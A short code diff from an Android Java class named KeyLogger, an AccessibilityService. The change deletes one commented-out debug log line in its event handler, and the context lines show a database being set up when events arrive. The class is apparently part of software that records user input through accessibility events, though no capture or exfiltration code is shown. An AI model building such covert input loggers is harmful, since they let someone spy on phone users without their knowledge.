@@ -28,7 +28,6 @@ public class KeyLogger extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        //Log.e(TAG, "EVENT TRIGGERED");
         //init DbMgr if it's null
         if (DbMgr.getDB() == null)
             DbMgr.init(getApplicationContext());
